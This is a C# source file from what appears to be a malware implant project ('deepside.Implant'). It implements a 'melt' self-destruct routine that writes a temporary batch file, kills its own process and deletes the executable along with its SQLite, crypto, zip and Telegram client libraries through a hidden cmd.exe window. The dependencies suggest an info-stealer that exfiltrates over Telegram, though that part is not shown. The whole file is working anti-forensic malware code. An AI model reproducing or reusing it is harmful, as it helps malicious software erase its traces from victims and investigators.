using System.IO;
using System.Diagnostics;

namespace deepside.Implant
{
    internal sealed class SelfDestruct
    {
        /// <summary>
        /// Delete file after first start
        /// </summary>
        public static void Melt()
        {
            // Paths
            string batch = Path.GetTempFileName() + ".bat";
            string path = System.Reflection.Assembly.GetExecutingAssembly().Location;
            string dll1 = Path.Combine(Path.GetDirectoryName(path), "DotNetZip.dll");
            //string dll2 = Path.Combine(Path.GetDirectoryName(path), "AnonFileApi.dll");
            string dll3 = Path.Combine(Path.GetDirectoryName(path), "blabla.config");
            string dll4 = Path.Combine(Path.GetDirectoryName(path), "BouncyCastle.Crypto.dll");
            string dll5 = Path.Combine(Path.GetDirectoryName(path), "SQLite.Interop.dll");
            string dll6 = Path.Combine(Path.GetDirectoryName(path), "System.Data.SQLite.dll");
            string dll7 = Path.Combine(Path.GetDirectoryName(path), "Telegram.Bot.dll");
            string dll8 = Path.Combine(Path.GetDirectoryName(path), "WTelegramClient.dll");

            string dll9 = Path.Combine(Path.GetDirectoryName(path), "System.Text.Encodings.Web.dll");
            string dll10 = Path.Combine(Path.GetDirectoryName(path), "System.Text.Json.dll");
            string dll11 = Path.Combine(Path.GetDirectoryName(path), "System.Threading.Tasks.Extensions.dll");
            string dll12 = Path.Combine(Path.GetDirectoryName(path), "IndexRange.dll");
            string dll13 = Path.Combine(Path.GetDirectoryName(path), "Newtonsoft.Json.dll");
            int currentPid = Process.GetCurrentProcess().Id;
            // Write batch
            using (StreamWriter sw = File.AppendText(batch))
            {
                sw.WriteLine("chcp 65001");
                sw.WriteLine("TaskKill /F /IM " + currentPid);
                sw.WriteLine("Timeout /T 2 /Nobreak");
                sw.WriteLine($"Del /ah \"{path}\" & Del /ah \"{dll1}\" & Del /ah \"{dll3}\" & Del /ah \"{dll4}\" & Del /ah \"{dll5}\" & Del /ah \"{dll6}\" & Del /ah \"{dll7}\" & Del /ah \"{dll8}\"& Del /ah \"{dll9}\" & Del /ah \"{dll10}\" & Del /ah \"{dll11}\" & Del /ah \"{dll12}\"& Del /ah \"{dll13}\"");
            }
            // Log
            //Logging.Log("SelfDestruct : Running self destruct procedure...");
            // Start
            Process.Start(new ProcessStartInfo()
            {
                FileName = "cmd.exe",
                Arguments = "/C " + batch,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true
            });
            // Wait for exit
            System.Threading.Thread.Sleep(5000);
            System.Environment.FailFast(null);
        }
    }
}
